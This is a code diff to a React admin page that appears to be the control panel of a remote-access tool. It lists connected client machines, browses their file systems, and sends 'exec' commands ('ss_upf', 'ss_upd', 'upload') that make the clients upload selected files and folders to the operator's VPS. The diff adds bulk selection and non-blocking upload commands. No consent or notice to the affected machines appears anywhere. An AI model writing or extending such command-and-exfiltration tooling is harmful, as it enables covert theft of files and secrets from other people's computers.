@@ -2,7 +2,7 @@
 
 import { FormEvent, useEffect, useMemo, useRef, useState } from "react";
 import { io, type Socket } from "socket.io-client";
-import { API_URL, api, downloadHref, getToken, type FileRow } from "@/lib/api";
+import { API_URL, api, diskDownloadHref, getToken } from "@/lib/api";
 import { formatDate } from "@/lib/format";
 
 type Reply = { event: string; payload: unknown; at: string };
@@ -18,7 +18,7 @@ type LiveSocket = {
 
 type DirEntry = { name: string; isDirectory: boolean; isFile: boolean };
 type DirResult = { currentPath: string; contents: DirEntry[] };
-type FileContent = { filename?: string; content?: string; message?: string };
+type DiskSaved = { file_name: string; path?: string; id?: string; size_bytes?: number };
 
 const TEXT_EXT =
   /\.(txt|log|md|json|csv|xml|html|htm|css|js|ts|tsx|jsx|yml|yaml|ini|conf|cfg|env|py|java|c|h|sql|bat|ps1|sh|php|rb|go|rs|toml|svg)$/i;
@@ -140,6 +140,15 @@ function FileRow({
         if (!longPress.current) onOpen();
       }}
     >
+      <td>
+        <input
+          className="check"
+          type="checkbox"
+          checked={picked}
+          onClick={(event) => event.stopPropagation()}
+          onChange={onToggleSelect}
+        />
+      </td>
       <td>{entry.name}</td>
       <td>
         <span className={`badge ${entry.isDirectory ? "" : "badge-text"}`}>
@@ -169,7 +178,10 @@ export default function LivePage() {
   const skipBrowseRef = useRef(false);
   const historyRef = useRef<string[]>([]);
   const fileWaiters = useRef<Array<(payload: FileContent & { error?: boolean }) => void>>([]);
-  const vpsWaiters = useRef<Array<{ fileName: string; resolve: (row: FileRow) => void }>>([]);
+  const vpsWaiters = useRef<
+    Array<{ fileName: string; resolve: (row: DiskSaved) => void; reject: (err: Error) => void }>
+  >([]);
+  const cancelledRef = useRef(false);
 
   const selected = sockets.find((row) => row.socketId === selectedId) || null;
   selectedIdRef.current = selectedId;
@@ -303,7 +315,7 @@ export default function LivePage() {
         setStatus(asText(entry.payload));
       }
     });
-    socket.on("file_saved", (row: FileRow) => {
+    socket.on("file_saved", (row: DiskSaved) => {
       const index = vpsWaiters.current.findIndex((item) => item.fileName === row.file_name);
       if (index >= 0) {
         const waiter = vpsWaiters.current.splice(index, 1)[0];
@@ -312,6 +324,9 @@ export default function LivePage() {
     });
     socket.on("connect_error", (err) => setError(err.message));
     return () => {
+      cancelledRef.current = true;
+      vpsWaiters.current.forEach((waiter) => waiter.reject(new Error("Cancelled")));
+      vpsWaiters.current = [];
       socket.disconnect();
     };
   }, []);
@@ -332,62 +347,45 @@ export default function LivePage() {
   }, [selectedId]);
 
   function waitForVpsSave(fileName: string, timeoutMs = 30 * 60 * 1000) {
-    const username = (selectedIdentRef.current.split("::")[0] || selected?.username || "").trim();
-    return new Promise<FileRow>((resolve, reject) => {
+    return new Promise<DiskSaved>((resolve, reject) => {
       let settled = false;
-      const finish = (row: FileRow) => {
+      const finish = (row: DiskSaved) => {
         if (settled) return;
         settled = true;
         window.clearTimeout(timer);
         vpsWaiters.current = vpsWaiters.current.filter((item) => item.resolve !== finish);
         resolve(row);
       };
-      const timer = window.setTimeout(async () => {
-        vpsWaiters.current = vpsWaiters.current.filter((item) => item.resolve !== finish);
+      const fail = (err: Error) => {
         if (settled) return;
-        try {
-          const query = username
-            ? `/admin/files?username=${encodeURIComponent(username)}&q=${encodeURIComponent(fileName)}`
-            : `/admin/files?q=${encodeURIComponent(fileName)}`;
-          const data = await api<{ files: FileRow[] }>(query);
-          const hit = (data.files || []).find((row) => row.file_name === fileName);
-          if (hit) {
-            finish(hit);
-            return;
-          }
-        } catch {
-          // ignore last-chance poll errors
-        }
-        if (!settled) {
-          settled = true;
-          reject(new Error(`Timed out waiting for VPS save: ${fileName}`));
-        }
+        settled = true;
+        window.clearTimeout(timer);
+        vpsWaiters.current = vpsWaiters.current.filter((item) => item.resolve !== finish);
+        reject(err);
+      };
+      const timer = window.setTimeout(() => {
+        fail(new Error(`Timed out waiting for VPS save: ${fileName}`));
       }, timeoutMs);
-      vpsWaiters.current.push({ fileName, resolve: finish });
-
-      (async () => {
-        const started = Date.now();
-        while (!settled && Date.now() - started < timeoutMs) {
-          await sleep(2000);
-          if (settled) return;
-          try {
-            const query = username
-              ? `/admin/files?username=${encodeURIComponent(username)}&q=${encodeURIComponent(fileName)}`
-              : `/admin/files?q=${encodeURIComponent(fileName)}`;
-            const data = await api<{ files: FileRow[] }>(query);
-            const hit = (data.files || []).find((row) => row.file_name === fileName);
-            if (hit) finish(hit);
-          } catch {
-            // keep waiting; one poll error must not stop the batch
-          }
-        }
-      })();
+      vpsWaiters.current.push({ fileName, resolve: finish, reject: fail });
     });
   }
 
-  function downloadFromVps(id: string, filename: string) {
+  function cancelTransfer() {
+    cancelledRef.current = true;
+    const waiters = [...vpsWaiters.current];
+    vpsWaiters.current = [];
+    waiters.forEach((waiter) => waiter.reject(new Error("Cancelled")));
+    setBusy(false);
+    setStatus("Stopped waiting. The client may still be uploading in the background.");
+  }
+
+  function downloadFromVps(saved: DiskSaved, filename: string) {
+    const href = saved.path
+      ? diskDownloadHref(saved.path)
+      : "";
+    if (!href) return;
     const link = document.createElement("a");
-    link.href = downloadHref("files", id);
+    link.href = href;
     link.download = filename;
     link.rel = "noopener";
     document.body.appendChild(link);
@@ -424,53 +422,65 @@ export default function LivePage() {
       return;
     }
     const chosen = items.filter((item) => picked.has(entryKey(item)));
-    const targets = chosen.length
-      ? chosen
-      : [{ name: listing.currentPath || ".", isDirectory: true, isFile: false, wholeFolder: true }];
+    if (!chosen.length) {
+      setError("Select files and/or folders first (use the checkboxes).");
+      return;
+    }
+    const folders = chosen.filter((item) => item.isDirectory);
+    const files = chosen.filter((item) => !item.isDirectory);
     const ok: string[] = [];
     const fail: string[] = [];
+    cancelledRef.current = false;
     setBusy(true);
     setError("");
-    setStatus(alsoLaptop ? "VPS first, then copy to this PC…" : "Saving to VPS…");
+    setStatus("Sending upload commands…");
 
-    for (let i = 0; i < targets.length; i += 1) {
-      const item = targets[i] as DirEntry & { wholeFolder?: boolean };
-      try {
-        if (item.isDirectory) {
-          const folder = item.wholeFolder ? listing.currentPath : joinClientPath(listing.currentPath, item.name);
-          setStatus(`(${i + 1}/${targets.length}) Upload folder to VPS: ${folder}`);
-          const sent = await send("upload", folder);
-          if (!sent) throw new Error("socket send failed (client reconnecting)");
-          ok.push(`${item.name || folder}: VPS folder upload started`);
-          await sleep(500);
-          continue;
-        }
+    for (const folder of folders) {
+      if (cancelledRef.current) break;
+      const full = joinClientPath(listing.currentPath, folder.name);
+      setStatus(`Folder: ${full}`);
+      const sentUpd = await send("exec", `ss_upd ${folder.name}`);
+      const sentUpload = await send("upload", full);
+      if (!sentUpd && !sentUpload) fail.push(`${folder.name}: socket send failed`);
+      else ok.push(`${folder.name}: folder upload command sent`);
+      await sleep(400);
+    }
 
-        setStatus(`(${i + 1}/${targets.length}) Save ${item.name} to VPS`);
-        const sent = await send("exec", `ss_upf ${item.name}`);
-        if (!sent) throw new Error("socket send failed (client reconnecting)");
-        const saved = await waitForVpsSave(item.name);
-        ok.push(`${item.name}: saved on VPS`);
-        if (alsoLaptop) {
-          downloadFromVps(saved.id, item.name);
-          ok.push(`${item.name}: browser download started (Downloads folder)`);
+    for (const file of files) {
+      if (cancelledRef.current) break;
+      setStatus(`File: ${file.name}`);
+      const sent = await send("exec", `ss_upf ${file.name}`);
+      if (!sent) {
+        fail.push(`${file.name}: socket send failed`);
+        continue;
+      }
+      ok.push(`${file.name}: file upload command sent`);
+      if (alsoLaptop && files.length === 1 && folders.length === 0) {
+        try {
+          const saved = await waitForVpsSave(file.name);
+          downloadFromVps(saved, file.name);
+          ok.push(`${file.name}: browser download started`);
+        } catch (err) {
+          fail.push(`${file.name}: ${err instanceof Error ? err.message : "wait failed"}`);
         }
-      } catch (err) {
-        fail.push(`${item.name}: ${err instanceof Error ? err.message : "failed"}`);
       }
       await sleep(400);
     }
 
     const summary = [
-      `Done. ${ok.length} ok, ${fail.length} failed.`,
+      cancelledRef.current ? "Stopped." : "Commands sent.",
+      `${ok.length} ok, ${fail.length} failed.`,
       ...ok,
       ...fail.map((line) => `FAIL ${line}`),
-      alsoLaptop
-        ? "Laptop copies go to your browser Downloads folder (usually C:\\Users\\<you>\\Downloads\\)."
-        : "VPS copies are in Explorer / server uploads.",
-    ].join("\n");
+      "Watch POST /file-upload in the API log. Then use the Disk tab to download from the VPS.",
+      alsoLaptop && (files.length !== 1 || folders.length)
+        ? "Laptop copy is only auto-started for a single file. For many items, download from Disk after upload finishes."
+        : "",
+    ]
+      .filter(Boolean)
+      .join("\n");
     setStatus(summary);
-    setError(fail.length ? `${fail.length} file(s) failed. Other files continued.` : "");
+    setError(fail.length ? `${fail.length} command(s) failed. Other items continued.` : "");
     setBusy(false);
   }
 
@@ -569,21 +579,25 @@ export default function LivePage() {
                 <button className="btn" type="button" onClick={() => transferSelected(true)} disabled={busy}>
                   Save to VPS + this PC
                 </button>
+                {busy ? (
+                  <button className="btn btn-danger" type="button" onClick={cancelTransfer}>
+                    Stop waiting
+                  </button>
+                ) : null}
                 <span className="mono">
                   {picked.size} selected
                   {listing?.currentPath ? ` · ${listing.currentPath}` : ""}
                 </span>
               </div>
               <p className="fe-hint">
-                VPS is primary. Files go to the server with `ss_upf` / `upload` (same as the client HTTP upload).
-                "Save to VPS + this PC" then downloads from the VPS to your browser Downloads folder
-                (`C:\Users\&lt;you&gt;\Downloads\`). Many files run one by one; a failure skips that file and continues.
-                This does not use `read_file`, so the socket should stay up.
+                Use checkboxes to select multiple files and folders. Folders send `ss_upd` + `upload`. Files send
+                `ss_upf` without waiting (so one empty/slow file cannot block the rest). Then download from the Disk tab.
               </p>
               <div className="table-wrap">
                 <table>
                   <thead>
                     <tr>
+                      <th></th>
                       <th>Name</th>
                       <th>Type</th>
                     </tr>
@@ -591,13 +605,13 @@ export default function LivePage() {
                   <tbody>
                     {!listing ? (
                       <tr>
-                        <td colSpan={2} className="empty">
+                        <td colSpan={3} className="empty">
                           Loading folder… If this stays empty, type a path and press Go.
                         </td>
                       </tr>
                     ) : items.length === 0 ? (
                       <tr>
-                        <td colSpan={2} className="empty">
+                        <td colSpan={3} className="empty">
                           Empty folder.
                         </td>
                       </tr>
